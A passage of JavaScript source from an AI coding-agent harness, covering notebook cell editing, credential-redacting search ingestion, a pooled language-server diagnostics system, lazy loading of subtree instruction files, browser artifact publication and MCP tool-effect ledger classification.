  if (!nb || !Array.isArray(nb.cells)) {
    return { error: "Not a valid notebook: missing cells[] (need nbformat 4)" };
  }
  const mode = args.edit_mode || "replace";
  if (!["replace", "insert", "delete"].includes(mode)) {
    return { error: `Unknown edit_mode "${mode}" (replace|insert|delete)` };
  }
  // .ipynb stores source as an array of lines that each KEEP their trailing \n.
  const toLines = (s) => {
    const t = String(s ?? "");
    return t === "" ? [] : t.split(/(?<=\n)/);
  };
  // Re-serialize with Jupyter's 1-space indent + trailing newline.
  const out = (summary, cellId) => ({
    text: JSON.stringify(nb, null, 1) + "\n",
    summary,
    cellId,
  });
  const locate = () => {
    if (args.cell_id != null) {
      return nb.cells.findIndex((c) => c && c.id === args.cell_id);
    }
    if (Number.isInteger(args.cell_index)) {
      return args.cell_index >= 0 && args.cell_index < nb.cells.length
        ? args.cell_index
        : -1;
    }
    return -2; // no locator supplied
  };

  if (mode === "insert") {
    if (typeof args.new_source !== "string") {
      return { error: "new_source is required for edit_mode 'insert'" };
    }
    const ct = args.cell_type;
    if (ct !== "code" && ct !== "markdown") {
      return {
        error:
          "cell_type ('code'|'markdown') is required for edit_mode 'insert'",
      };
    }
    const id = _newNotebookCellId();
    const cell =
      ct === "code"
        ? {
            cell_type: "code",
            id,
            metadata: {},
            source: toLines(args.new_source),
            outputs: [],
            execution_count: null,
          }
        : {
            cell_type: "markdown",
            id,
            metadata: {},
            source: toLines(args.new_source),
          };
    let at = 0;
    if (args.cell_id != null || Number.isInteger(args.cell_index)) {
      const idx = locate();
      if (idx < 0) return { error: "Target cell not found for insert" };
      at = idx + 1; // insert AFTER the target
    }
    nb.cells.splice(at, 0, cell);
    return out(`inserted ${ct} cell at index ${at}`, id);
  }

  // replace / delete both need an existing target
  const idx = locate();
  if (idx === -2) {
    return {
      error: "Provide cell_id or cell_index to identify the target cell",
    };
  }
  if (idx < 0) {
    return {
      error: `Target cell not found (${
        args.cell_id != null
          ? "cell_id " + args.cell_id
          : "cell_index " + args.cell_index
      })`,
    };
  }

  if (mode === "delete") {
    const [removed] = nb.cells.splice(idx, 1);
    return out(`deleted cell at index ${idx}`, removed?.id);
  }

  // replace
  if (typeof args.new_source !== "string") {
    return { error: "new_source is required for edit_mode 'replace'" };
  }
  const cell = nb.cells[idx];
  cell.source = toLines(args.new_source);
  if (cell.cell_type === "code") {
    cell.outputs = [];
    cell.execution_count = null;
  }
  return out(`replaced ${cell.cell_type} cell at index ${idx}`, cell.id);
}

/**
 * Render a Jupyter notebook (.ipynb) as a compact, token-cheap cell listing so
 * the model can locate cells (index + id + type + source) to edit with
 * notebook_edit — instead of drowning in raw JSON / base64 output blobs. Cell
 * OUTPUTS are summarized, not dumped. Pure + exported for tests; returns null
 * when the text is not a parseable nbformat-4 notebook (caller falls back to raw).
 */
export function renderNotebook(text) {
  let nb;
  try {
    nb = JSON.parse(text);
  } catch {
    return null;
  }
  if (!nb || !Array.isArray(nb.cells)) return null;
  const srcOf = (c) =>
    Array.isArray(c.source) ? c.source.join("") : String(c.source ?? "");
  const lines = [
    `Jupyter notebook — ${nb.cells.length} cell(s), nbformat ${nb.nbformat ?? "?"}. Edit cells with the notebook_edit tool (target by the id shown below). Pass raw:true to read_file for the underlying JSON.`,
    "",
  ];
  nb.cells.forEach((c, i) => {
    const id = c && c.id != null ? ` id=${c.id}` : "";
    lines.push(`── Cell ${i} [${(c && c.cell_type) || "?"}${id}] ──`);
    const src = srcOf(c || {});
    lines.push(src.length ? src.replace(/\n$/, "") : "(empty)");
    if (
      c &&
      c.cell_type === "code" &&
      Array.isArray(c.outputs) &&
      c.outputs.length
    ) {
      lines.push(`  ⟨${c.outputs.length} output(s) hidden⟩`);
    }
    lines.push("");
  });
  return lines.join("\n");
}

/**
 * Ingest the raw stdout of a search_files command into the shared hit
 * accumulator: split into lines, dedup via `seen`, redact credential-file
 * content hits, label multi-root results, and stop at the hit cap. Pure aside
 * from mutating the passed-in `seen`/`hits`/`redactedCreds` collectors.
 *
 * Shared by the success path AND the maxBuffer-overflow salvage path: a search
 * on a large tree (especially Windows, where `findstr`/`dir /s` have no `head`
 * cap) can exceed execSync's maxBuffer and throw ENOBUFS — but the error still
 * carries the first maxBuffer of matches in `err.stdout`, so the same ingest is
 * run on it instead of dropping every match as a false "no matches".
 *
 * @param {string} output  raw command stdout (or a truncated partial)
 * @param {object} ctx  { isContent, root, multiRoot, seen, hits, redactedCreds,
 *                        credentialFileReason, limit? }
 */
export function _ingestSearchOutput(output, ctx) {
  const limit = ctx.limit ?? 20;
  for (const line of String(output || "")
    .trim()
    .split("\n")) {
    const v = line.trim();
    if (!v || ctx.seen.has(v)) continue;
    if (ctx.isContent) {
      // content hit is `file:line:text` (findstr /n) or a bare filename
      // (grep -l); pull the source file and redact credential matches.
      const src = v.match(/^(.+?):\d+:/)?.[1] ?? v;
      if (ctx.credentialFileReason(src)) {
        ctx.redactedCreds.add(src.replace(/\\/g, "/"));
        ctx.seen.add(v);
        continue;
      }
    }
    // Qualify with the root so multi-root results stay unambiguous.
    const labeled = ctx.multiRoot ? `${ctx.root}: ${v}` : v;
    ctx.seen.add(v);
    ctx.hits.push(labeled);
    if (ctx.hits.length >= limit) return;
  }
}

/**
 * Inner tool execution — no hooks, no plan-mode checks.
 */
// ─── Shared code-intelligence (LSP) pool ──────────────────────────────────
//
// A language server is expensive to start (spawns a process + indexes the
// project), so the `code_intelligence` tool reuses ONE warm CodeIntelligence
// per project root across tool calls within a run. To avoid the resource-leak
// trap (orphaned server processes / dangling timers), each root auto-disposes
// after an idle window, and a process-exit hook is registered once as a
// backstop. `coldStart:true` makes the first query per file wait for the
// project to load; warmed queries return immediately.
const _codeIntelPool = new Map(); // root -> { ci, idleTimer }
const CODE_INTEL_IDLE_MS = 60_000;
let _codeIntelExitHooked = false;

// Restart backoff between language-server re-spawns (P2 LSP): DEFAULT ON at a
// 1s base (1s→2s→4s→8s cap, see lsp-manager) so a server that crashes on
// startup can't burst `maxRestarts` spawns back-to-back before quarantine.
// `CC_LSP_RESTART_BACKOFF_MS` overrides the base; 0 restores the legacy
// immediate-respawn behavior.
const DEFAULT_LSP_RESTART_BACKOFF_MS = 1000;
function _lspRestartBackoffBaseMs() {
  const raw = process.env.CC_LSP_RESTART_BACKOFF_MS;
  if (raw !== undefined && raw !== "") {
    const n = Number(raw);
    if (Number.isFinite(n)) return Math.max(0, n);
  }
  return DEFAULT_LSP_RESTART_BACKOFF_MS;
}

export async function _getSharedCodeIntel(cwd) {
  const root = path.resolve(cwd || process.cwd());
  let entry = _codeIntelPool.get(root);
  if (!entry) {
    const { CodeIntelligence } =
      await import("../lib/lsp/code-intelligence.js");
    // Re-check AFTER the await: two concurrent callers (the parallel read-only
    // batch runs several `code_intelligence` calls at once) both observed an
    // empty pool before this `await import`, so without this guard both would
    // construct a CodeIntelligence — each spawning its own language server — and
    // the second `set` would orphan the first (leaked server process) while its
    // stale idle-timer, still bound to `root`, later evicts the wrong (warm,
    // in-use) entry. This is exactly the orphaned-server/dangling-timer trap the
    // pool exists to prevent. Construction below has NO further await, so once
    // one continuation wins the re-check the other reuses its entry — the window
    // is fully closed.
    entry = _codeIntelPool.get(root);
    if (!entry) {
      entry = {
        ci: new CodeIntelligence({
          projectRoot: root,
          coldStart: true,
          lspOptions: { restartBackoffBaseMs: _lspRestartBackoffBaseMs() },
        }),
        idleTimer: null,
      };
      _codeIntelPool.set(root, entry);
      if (!_codeIntelExitHooked) {
        _codeIntelExitHooked = true;
        process.once("exit", () => {
          for (const e of _codeIntelPool.values()) {
            try {
              e.ci.dispose();
            } catch {
              /* best-effort teardown on exit */
            }
          }
        });
      }
    }
  }
  if (entry.idleTimer) clearTimeout(entry.idleTimer);
  entry.idleTimer = setTimeout(() => {
    _codeIntelPool.delete(root);
    entry.ci.dispose().catch(() => {});
  }, CODE_INTEL_IDLE_MS);
  if (typeof entry.idleTimer.unref === "function") entry.idleTimer.unref();
  return entry.ci;
}

/** Dispose every pooled language server now (used by tests + explicit shutdown). */
export async function disposeSharedCodeIntel() {
  const entries = [..._codeIntelPool.values()];
  _codeIntelPool.clear();
  for (const e of entries) {
    if (e.idleTimer) clearTimeout(e.idleTimer);
  }
  await Promise.all(entries.map((e) => e.ci.dispose().catch(() => {})));
}

// Hard wall-clock cap so post-edit diagnostics never stall the agent: a cold
// language server can take seconds to load a project on the FIRST edit; after
// that the server is warm and answers in well under a second.
const EDIT_DIAGNOSTICS_WALL_MS = 6000;

/**
 * Best-effort "did this edit introduce a new error?" check. Run after a
 * successful workspace edit so the model sees fresh type/syntax errors in the
 * SAME turn instead of discovering them on the next build (the plan's
 * "编辑后执行增量诊断并将相关错误回喂 Agent"). Returns a compact array of
 * error/warning diagnostics, or null.
 *
 * Zero cost when no language server is installed for the file (probes first,
 * never cold-starts a server that isn't there) and fully bounded in time.
 * Disable entirely with CC_EDIT_DIAGNOSTICS=0.
 */
async function _postEditDiagnostics(filePath, cwd, additionalDirectories) {
  if (process.env.CC_EDIT_DIAGNOSTICS === "0") return null;
  // Multi-root workspace: resolve the server against the root that CONTAINS
  // the edited file (mirrors the code_intelligence handler) — editing a file
  // inside an `--add-dir` root probes/uses THAT project's language server
  // instead of degrading to "no diagnostics" via the cwd root. Single-root
  // sessions (no additionalDirectories) resolve to cwd exactly as before.
  let root;
  try {
    root = pickRootForFile(
      path.resolve(cwd || process.cwd(), filePath),
      workspaceRootsFor(cwd, additionalDirectories),
    );
  } catch {
    root = path.resolve(cwd || process.cwd());
  }
  let hasServer = false;
  try {
    const { languageIdForFile, resolveServer } =
      await import("../lib/lsp/lsp-server-registry.js");
    const languageId = languageIdForFile(filePath);
    if (!languageId) return null; // unsupported file type — no LSP, no cost
    hasServer = Boolean(resolveServer(languageId, root));
  } catch {
    return null;
  }
  if (!hasServer) return null;

  const query = (async () => {
    try {
      const ci = await _getSharedCodeIntel(root);
      const res = await ci.refreshFile(filePath, { timeoutMs: 3000 });
      if (!res || res.available === false) return null;
      const diags = (res.diagnostics || []).filter(
        (d) => d.severity === "error" || d.severity === "warning",
      );
      if (!diags.length) return null;
      // Bound by a TOKEN budget, severity-prioritized (errors survive over
      // warnings), replacing the arbitrary unsorted count-cap of 20. Guarantees
      // the model sees the most severe diagnostics first and can't be flooded by
      // a pathological diagnostics dump. Budget is overridable via
      // CC_EDIT_DIAGNOSTICS_TOKENS (default 2000).
      const { capDiagnostics } =
        await import("../lib/lsp/diagnostics-scheduler.js");
      const budget = Number(process.env.CC_EDIT_DIAGNOSTICS_TOKENS) || 2000;
      const { kept } = capDiagnostics(diags, { maxTokens: budget });
      return kept.length ? kept : null;
    } catch {
      return null;
    }
  })();

  let capTimer;
  const cap = new Promise((resolve) => {
    capTimer = setTimeout(() => resolve(null), EDIT_DIAGNOSTICS_WALL_MS);
    if (typeof capTimer.unref === "function") capTimer.unref();
  });
  try {
    return await Promise.race([query, cap]);
  } finally {
    clearTimeout(capTimer);
  }
}

/** Merge post-edit diagnostics into a successful edit result (no-op if none). */
export async function _withPostEditDiagnostics(
  result,
  filePath,
  cwd,
  additionalDirectories,
  managedCheckpoint = false,
) {
  // A cold language server is a long-lived child process. Starting one inside
  // a managed workspace transaction would keep a writer bound past tool
  // settlement and make commit/rollback unverifiable. Managed edits therefore
  // skip this best-effort enrichment; callers can request diagnostics after the
  // checkpoint has sealed.
  if (managedCheckpoint) return result;
  const newDiagnostics = await _postEditDiagnostics(
    filePath,
    cwd,
    additionalDirectories,
  );
  return newDiagnostics ? { ...result, newDiagnostics } : result;
}

// ─── Lazy subtree instruction injection (large-monorepo lever) ─────────────
//
// cc.md / CLAUDE.md / AGENTS.md that sit BELOW the startup cwd are intentionally
// NOT loaded up front — they cost tokens for subtrees a run may never touch.
// When a tool first ACCESSES a path inside such a subtree, we inject that
// subtree's directory instructions into the tool result (the SAME channel as
// newDiagnostics), exactly once per subtree per agent session. A stateful
// SubtreeInstructionLoader per root/session remembers what it already injected so a
// second access to the same subtree is a no-op. Disable with
// CC_SUBTREE_INSTRUCTIONS=0. Common case (no cc.md below cwd) → zero cost.
const _subtreeLoaderPool = new Map(); // root -> Map<session scope, loader>

async function _getSubtreeLoader(cwd, sessionScope = "__legacy__") {
  const root = path.resolve(cwd || process.cwd());
  let scopedLoaders = _subtreeLoaderPool.get(root);
  if (!scopedLoaders) {
    scopedLoaders = new Map();
    _subtreeLoaderPool.set(root, scopedLoaders);
  }
  let loader = scopedLoaders.get(sessionScope);
  if (!loader) {
    const { SubtreeInstructionLoader } =
      await import("../lib/project-instructions.js");
    let instructionExcludes;
    try {
      const { readStringArraySetting } =
        await import("../lib/settings-loader.cjs");
      instructionExcludes = readStringArraySetting("instructionExcludes", {
        cwd: root,
      });
    } catch {
      instructionExcludes = undefined; // fail-open — honor no excludes
    }
    loader = new SubtreeInstructionLoader({
      repoRoot: root,
      baseDir: root,
      instructionExcludes,
    });
    scopedLoaders.set(sessionScope, loader);
  }
  return loader;
}

/** Test/shutdown hook: forget every remembered subtree-injection set. */
export function _resetSubtreeInstructionLoaders() {
  _subtreeLoaderPool.clear();
}

/**
 * Freshly-discovered subtree instruction files for a path a tool just touched,
 * with their (capped) content read for inline injection — or null when the
 * subtree has no NEW cc.md/CLAUDE.md/AGENTS.md (the common case → zero cost).
 */
async function _prepareSubtreeInstructions(
  accessedPaths,
  cwd,
  sessionScope = "__legacy__",
) {
  if (process.env.CC_SUBTREE_INSTRUCTIONS === "0") return null;
  try {
    const loader = await _getSubtreeLoader(cwd, sessionScope);
    const discovered = new Map();
    for (const accessedPath of Array.isArray(accessedPaths)
      ? accessedPaths
      : [accessedPaths]) {
      for (const candidate of loader.discover(accessedPath)) {
        discovered.set(candidate.identity, candidate);
      }
    }
    const fresh = [...discovered.values()];
    if (!fresh || !fresh.length) return null;
    const { DEFAULT_MAX_FILE_BYTES } =
      await import("../lib/project-instructions.js");
    const out = [];
    const errors = [];
    for (const f of fresh) {
      try {
        const buf = fs.readFileSync(f.path);
        const truncated = buf.length > DEFAULT_MAX_FILE_BYTES;
        const content = (
          truncated ? buf.slice(0, DEFAULT_MAX_FILE_BYTES) : buf
        ).toString("utf-8");
        out.push({
          path: f.path,
          scope: f.scope || "project",
          content,
          ...(truncated ? { truncated: true } : {}),
        });
      } catch (err) {
        errors.push({ path: f.path, message: err.message });
      }
    }
    // Commit only after every candidate in the source/target batch has been
    // read. Any failure leaves the entire batch discoverable for a retry.
    if (!errors.length) loader.commit(fresh);
    return out.length || errors.length ? { instructions: out, errors } : null;
  } catch (err) {
    // Paths outside cwd are handled by the normal path/sandbox authority and
    // have no cwd-subtree rules. Other failures remain visible to mutation
    // preflight so they cannot silently widen authority.
    if (err?.code === "ERR_SUBTREE_INSTRUCTION_BOUNDARY") return null;
    return {
      instructions: [],
      errors: [{ path: null, message: err?.message || String(err) }],
    };
  }
}

async function _subtreeInstructionsFor(accessedPath, cwd, sessionScope) {
  const prepared = await _prepareSubtreeInstructions(
    accessedPath,
    cwd,
    sessionScope,
  );
  return prepared?.instructions?.length ? prepared.instructions : null;
}

async function _preflightMutationSubtreeInstructions(
  accessedPaths,
  cwd,
  sessionScope,
) {
  const prepared = await _prepareSubtreeInstructions(
    accessedPaths,
    cwd,
    sessionScope,
  );
  if (!prepared) return null;
  if (prepared.errors?.length) {
    return {
      error:
        "[Subtree Instructions] Mutation blocked because applicable instructions could not be loaded. No mutation was performed.",
      policy: { decision: "blocked", via: "subtree-instructions" },
      instructionLoadErrors: prepared.errors,
      mutationPerformed: false,
      ...(prepared.instructions?.length
        ? { subtreeInstructions: prepared.instructions }
        : {}),
    };
  }
  if (!prepared.instructions?.length) return null;
  return {
    error:
      "[Subtree Instructions] Mutation deferred before its first effect. Review these authoritative subtree rules, then retry the tool call.",
    policy: { decision: "deferred", via: "subtree-instructions" },
    subtreeInstructions: prepared.instructions,
    mutationPerformed: false,
  };
}

/**
 * Attach freshly-discovered subtree instructions to a SUCCESSFUL tool result
 * (no-op on an error result or when the subtree has nothing new).
 */
async function _withSubtreeInstructions(
  result,
  accessedPath,
  cwd,
  sessionScope,
) {
  if (result && result.error) return result;
  const subtreeInstructions = await _subtreeInstructionsFor(
    accessedPath,
    cwd,
    sessionScope,
  );
  return subtreeInstructions ? { ...result, subtreeInstructions } : result;
}

/**
 * Drop skills whose `paths:` frontmatter scopes them to a different subtree than
 * the agent's cwd (large-monorepo lazy skill surface). A skill with no `paths`
 * applies everywhere, so a skill set with none is returned unchanged. Best-effort:
 * any failure (or an unlocatable project root → relCwd "") falls open to the full
 * list, never hiding a skill spuriously.
 */
async function filterSkillsByCwd(skills, cwd) {
  try {
    if (!Array.isArray(skills) || skills.every((s) => !s?.paths)) return skills;
    const { filterSkillsByRelCwd, relCwdForCwd } =
      await import("../lib/skill-path-scope.js");
    const { findProjectRoot } = await import("../lib/project-detector.js");
    const root = (cwd && findProjectRoot(cwd)) || cwd || "";
    return filterSkillsByRelCwd(skills, relCwdForCwd(cwd, root));
  } catch {
    return skills; // fail-open: never hide a skill because scoping errored
  }
}

async function promoteBrowserGeneratedArtifact(
  filePath,
  { sessionId = null, title, kind, failureLabel } = {},
) {
  if (!filePath) return { artifact: null, error: null };
  try {
    const { ArtifactStore, publicArtifactMetadata } =
      await import("../lib/artifact-store.js");
    const entry = new ArtifactStore().publish({
      filePath,
      title,
      kind,
      sessionId: sessionId ? String(sessionId) : null,
    });
    return { artifact: publicArtifactMetadata(entry), error: null };
  } catch (err) {
    const code =
      typeof err?.code === "string"
        ? err.code.replace(/[^A-Z0-9_-]/gi, "").slice(0, 40)
        : "";
    return {
      artifact: null,
      error: `${failureLabel} artifact publication failed${code ? ` (${code})` : ""}`,
    };
  } finally {
    try {
      fs.rmSync(filePath, { force: true });
    } catch {
      /* best-effort cleanup */
    }
  }
}

async function promoteBrowserScreenshot(
  filePath,
  { sessionId = null, title = "Browser screenshot" } = {},
) {
  return promoteBrowserGeneratedArtifact(filePath, {
    sessionId,
    title,
    kind: "screenshot",
    failureLabel: "browser screenshot",
  });
}

async function promoteBrowserDownload(
  filePath,
  { sessionId = null, title = "Browser download" } = {},
) {
  return promoteBrowserGeneratedArtifact(filePath, {
    sessionId,
    title,
    kind: "data",
    failureLabel: "browser download",
  });
}

async function publishBrowserEvidence(envelope, sessionId) {
  if (!envelope?.envelopeDigest) return { artifact: null, error: null };
  try {
    const { ArtifactStore, publicArtifactMetadata } =
      await import("../lib/artifact-store.js");
    const {
      browserEvidenceDigest,
      canonicalBrowserEvidenceJson,
      verifyBrowserEvidenceEnvelope,
    } = await import("../lib/browser-evidence.js");
    verifyBrowserEvidenceEnvelope(envelope);
    if (!sessionId || String(sessionId) !== envelope.binding.session.id) {
      throw new Error("browser evidence is not bound to the active session");
    }
    const data = `${canonicalBrowserEvidenceJson(envelope)}\n`;
    const expectedFileDigest = browserEvidenceDigest(data).slice(
      "sha256:".length,
    );
    const expectedLineage = {
      schema: envelope.schema,
      sessionId: envelope.binding.session.id,
      sessionRevision: envelope.binding.session.revision,
      diffDigest: envelope.binding.diff.digest,
      testRunId: envelope.binding.testRun.id,
    };
    const store = new ArtifactStore();
    const published = store.publishDataOnce({
      data,
      fileName: "browser-evidence-envelope.json",
      title: `Browser evidence ${envelope.binding.session.id}@${envelope.binding.session.revision}`,
      kind: "data",
      mime: "application/json",
      sessionId: String(sessionId),
      immutable: true,
      recordDigest: envelope.envelopeDigest,
      lineage: expectedLineage,
    });
    const entry = published.entry;
    const integrity = store.verifyIntegrity(entry);
    if (
      !integrity.ok ||
      entry.sessionId !== String(sessionId) ||
      entry.immutable !== true ||
      entry.recordDigest !== envelope.envelopeDigest ||
      entry.sha256 !== expectedFileDigest ||
      canonicalBrowserEvidenceJson(entry.lineage) !==
        canonicalBrowserEvidenceJson(expectedLineage)
    ) {
      throw new Error("persisted evidence authority failed verification");
    }
    return {
      artifact: publicArtifactMetadata(entry),
      error: null,
    };
  } catch (error) {
    const code =
      typeof error?.code === "string"
        ? error.code.replace(/[^A-Z0-9_-]/giu, "").slice(0, 40)
        : "";
    return {
      artifact: null,
      error: `browser evidence artifact publication failed${code ? ` (${code})` : ""}`,
    };
  }
}

async function resolveBrowserUploadArtifact(artifactId, sessionId) {
  const { ArtifactStore, publicArtifactMetadata } =
    await import("../lib/artifact-store.js");
  const store = new ArtifactStore();
  return store.withIndexSnapshot((entries) => {
    const matches = entries.filter((entry) => entry.id === artifactId);
    if (matches.length !== 1) {
      throw new Error(
        matches.length === 0
          ? "upload artifact was not found"
          : "upload artifact authority is ambiguous",
      );
    }
    const entry = matches[0];
    if (!sessionId || entry.sessionId !== String(sessionId)) {
      throw new Error("upload artifact is not bound to the active session");
    }
    if (
      typeof entry.file !== "string" ||
      path.basename(entry.file) !== entry.file ||
      !(entry.file === entry.id || entry.file.startsWith(`${entry.id}.`)) ||
      !/^[a-f0-9]{64}$/u.test(String(entry.sha256 || ""))
    ) {
      throw new Error("upload artifact storage authority is invalid");
    }
    const integrity = store.verifyIntegrity(entry);
    if (!integrity.ok) {
      throw new Error("upload artifact failed digest verification");
    }
    const storedPath = store.storedPath(entry);
    if (fs.statSync(storedPath).size !== Number(entry.size)) {
      throw new Error("upload artifact size authority mismatch");
    }
    const temporaryDirectory = fs.mkdtempSync(
      path.join(os.tmpdir(), "cc-browser-upload-"),
    );
    const temporaryPath = path.join(
      temporaryDirectory,
      path.basename(entry.file || "upload.bin"),
    );
    try {
      fs.writeFileSync(temporaryPath, fs.readFileSync(storedPath), {
        flag: "wx",
        mode: 0o600,
        flush: true,
      });
    } catch (error) {
      fs.rmSync(temporaryDirectory, { recursive: true, force: true });
      throw error;
    }
    return {
      path: temporaryPath,
      metadata: publicArtifactMetadata(entry),
      cleanup: () =>
        fs.rmSync(temporaryDirectory, { recursive: true, force: true }),
    };
  });
}

const MCP_LEDGER_EFFECTS = new Set(["read", "unknown", "write", "destructive"]);

/**
 * Reduce descriptor + managed-host metadata to the host-owned contract written
 * to the MCP ledger. A server's read-only declaration is never promoted to a
 * read authorization. Server declarations may only make the classification
 * stricter (write/destructive) when host authority is absent.
 */
function mcpLedgerEffectContract(descriptor, hostPolicy) {
  const descriptorContract = descriptor?.effectContract || {};
  const hostContract = hostPolicy?.effectContract || {};
  const authorizedCandidate =
    hostContract.authorizedEffect || hostPolicy?.authorizedEffect;
  const authorizedEffect = MCP_LEDGER_EFFECTS.has(authorizedCandidate)
    ? authorizedCandidate
    : null;
  const declaredEffect = MCP_LEDGER_EFFECTS.has(
    descriptorContract.declaredEffect,
  )
    ? descriptorContract.declaredEffect
    : "unknown";
  // Host authority may raise an unknown/read declaration to a stricter effect,
  // but it may never downgrade the conservative peer risk floor. In
  // particular, an accidentally stale host `read` policy cannot turn a newly
  // declared write/destructive tool into a trusted read.
  const effect =
    declaredEffect === "destructive" || authorizedEffect === "destructive"
      ? "destructive"
      : declaredEffect === "write" || authorizedEffect === "write"
        ? "write"
        : declaredEffect === "unknown"
          ? "unknown"
          : authorizedEffect || "unknown";
  const annotations = descriptorContract.annotations || {};

  return {
    effect,
    destructive:
      effect === "destructive" || annotations.destructiveHint === true,
    sideEffecting: effect === "write" || effect === "destructive",
    idempotent:
      typeof annotations.idempotentHint === "boolean"
        ? annotations.idempotentHint
        : null,
    openWorld:
      typeof annotations.openWorldHint === "boolean"
        ? annotations.openWorldHint
        : null,
    trusted:
      authorizedEffect != null &&
      (hostContract.trusted === true || hostPolicy?.sourceTrusted === true) &&
      // Trust is valid only when the host authorization is at least as strict
      // as the merged effect. A stale host `read` classification cannot lend
      // trust to a server that now declares write/destructive behavior.
      authorizedEffect === effect &&
      // Trusted-read execution/parallelism requires the intersection promised
      // by the roadmap: a server read declaration plus host authorization.
      // An unmarked tool stays untrusted even when a host policy predicts read.
      (effect !== "read" || declaredEffect === "read"),
    source:
      hostContract.provenance ||
      descriptorContract.provenance ||
      descriptor?.source ||
      "mcp",
  };
}

function mcpLedgerScopes(args) {
  const resourceScopes = [];
  const networkScopes = [];
  const visit = (value, key = "", depth = 0) => {
    if (depth > 3 || value == null) return;
    if (Array.isArray(value)) {
      value.slice(0, 32).forEach((entry) => visit(entry, key, depth + 1));
      return;
    }
    if (typeof value === "object") {
      Object.entries(value)
        .slice(0, 64)
        .forEach(([childKey, childValue]) =>
          visit(childValue, childKey, depth + 1),
        );
      return;
    }
    if (typeof value !== "string") return;

    const normalizedKey = String(key).toLowerCase();
    const isNetworkScope = /url|uri|endpoint|origin|host/.test(normalizedKey);
    if (isNetworkScope) {
      networkScopes.push(value);
    }
    // URL/URI values can carry credentials, query secrets and private paths.
    // The network ledger normalizes them to origin only; never duplicate the
    // raw value into resourceScopes, whose identifiers are intentionally not
    // URL parsers. The input digest still binds the exact request at rest.
    if (
      !isNetworkScope &&
      /path|file|resource|repo|project|workspace/.test(normalizedKey)
    ) {
      resourceScopes.push(`${normalizedKey}:${value}`);
    }
  };
  visit(args || {});
  return { resourceScopes, networkScopes };
}

const MCP_TRANSPORT_OUTCOME_UNKNOWN_CODE = "CC_MCP_TRANSPORT_OUTCOME_UNKNOWN";
const MCP_PROTOCOL_RESULT_INVALID_CODE = "CC_MCP_PROTOCOL_RESULT_INVALID";
const MCP_RESULT_PROJECTION_FAILED_CODE = "CC_MCP_RESULT_PROJECTION_FAILED";

function safeMcpProperty(value, property) {
  if (!value || (typeof value !== "object" && typeof value !== "function")) {
    return undefined;
  }
  try {
    if (isProxy(value)) return undefined;
    const descriptor = Object.getOwnPropertyDescriptor(value, property);
    return descriptor && Object.hasOwn(descriptor, "value")
      ? descriptor.value
      : undefined;
  } catch {
    return undefined;
  }
}

function safeMcpErrorMessage(error) {
  if (safeMcpProperty(error, "mcpErrorCode") === "CC_MCP_RPC_ERROR") {
    const rpcCode = safeMcpProperty(error, "rpcCode");
    return Number.isSafeInteger(rpcCode)
      ? `MCP server returned a JSON-RPC error (code ${rpcCode})`
      : "MCP server returned a JSON-RPC error";
  }
  // HTTP status bodies are peer-controlled. The production transport omits
  // them at source, and this boundary independently prevents any MCP client
  // honoring the stable transport error code from projecting one into tool
  // results, models, or sessions.
  if (safeMcpProperty(error, "code") === "CC_MCP_HTTP_STATUS") {
    const status = safeMcpProperty(error, "status");
    return Number.isInteger(status) && status >= 100 && status <= 599
      ? `MCP HTTP request failed with status ${status}`
      : "MCP HTTP request failed";
  }
  const message = safeMcpProperty(error, "message");
  if (typeof message === "string" && message) return message;
  if (typeof error === "string" && error) return error;
  return "unknown error";
}

function safeMcpErrorCode(error, fallback) {
  const code = safeMcpProperty(error, "code");
  return typeof code === "string" && code ? code : fallback;
}

function projectMcpCallError(error) {
  const projected = new Error(safeMcpErrorMessage(error));
  const code = isMcpRpcError(error)
    ? "CC_MCP_RPC_ERROR"
    : safeMcpErrorCode(error, null);
  if (code) projected.code = code;
  return projected;
}

function invalidMcpProtocolResult(cause) {
  const error = new TypeError("MCP result could not be inspected safely", {
    cause,
  });
  error.code = MCP_PROTOCOL_RESULT_INVALID_CODE;
  return error;
}

function mcpTransportOutcomeIsUnsafe(effectContract) {
  return !(
    effectContract?.effect === McpEffect.READ &&
    effectContract?.trusted === true
  );
}

function mcpOutcomeUnknownPayload(
  ledger,
  ticket,
  { phase, reasonCode = MCP_OUTCOME_UNKNOWN_CODE } = {},
) {
  const stableReasonCode =
    typeof reasonCode === "string" && reasonCode
      ? reasonCode
      : MCP_OUTCOME_UNKNOWN_CODE;
  try {
    markMcpLedgerOutcomeUnknown(ledger, stableReasonCode);
  } catch {
    // The public result must remain deterministic even for a hostile ledger.
  }
  return {
    error:
      "MCP tool may have completed, but its outcome is unknown; do not retry automatically until durable recovery is adjudicated.",
    code: MCP_OUTCOME_UNKNOWN_CODE,
    status: "outcome_unknown",
    outcomeUnknown: true,
    retryable: false,
    mcpLedgerId: safeMcpProperty(ticket, "ledgerId") || null,
    mcpLedgerIncident: {
      phase: phase || "settled",
      code: stableReasonCode,
    },
  };
}

async function executeToolInner(
  name,
  args,
  {
    skillLoader,
    skillAllowlist = null,
    skillOutcomeIndex,
    skillVectorAuthority,
    skillRetrievalRevocationReader,
    cwd,
    parentMessages,
    interaction,
    sessionId,
    turnId,
    toolCallId,
    workflowEffectId = null,
    workflowChildEffectId = null,
    workflowChildSequence = null,
    workflowEffectProtocol = null,
    planManager = null,
    permissionRules = null,
    effectiveAllowedToolNames = null,
    hostManagedToolPolicy,
    externalToolDescriptors,
    externalToolExecutors,
    extraToolDefinitions = null,
    mcpClient,
    mcpHostClient = mcpClient,
    mcpCallLedger = null,
    mcpConflictScheduler = null,
    mcpDispatchAdmission = null,
    subtreeInstructionScope = "__legacy__",
    memoryDb = null,
    permanentMemory = null,
    subAgentContract = null,
    llmOptions,
    shellPolicyOverrides,
    classifyAllShell = false,
    approvalGate,
    shellConfirm,
    additionalDirectories,
    sandbox,
    ruleAllowed = false,
    settingsVerdict = null,
    shellDispatchPolicyAuthority = null,
    subAgentDepth = 0,
    subAgentBudget = null,
    sessionBudget = null,
    interactiveApproval = false,
    settingsHooks = null,
    signal = null,
    backgroundSubAgents = null,
    subAgentUsageSink = null,
    strictUsageTelemetry = false,
    onUsageBoundary = null,
    onUsageSettlement = null,
    onProviderReceipt = null,
    onToolCallBoundary = null,
    onToolCallSettlement = null,
    backgroundUsageFailureState = null,
    toolAdmission = null,
    hostResourceBudget = null,
    unattendedActionPolicy = null,
    managedCheckpoint = false,
    fileMutationScope = null,
    hermeticExecution = false,
    browserEvidenceBinding = null,
    browserOriginGrants = null,
    browserExpectedGrantRevisions = null,
    browserReplaySourceEnvelope = null,
    browserReplayAllowSideEffects = false,
    browserReplayAllowCredentials = false,
    // Hook-envelope tracing: this run's trace id, threaded into child loops
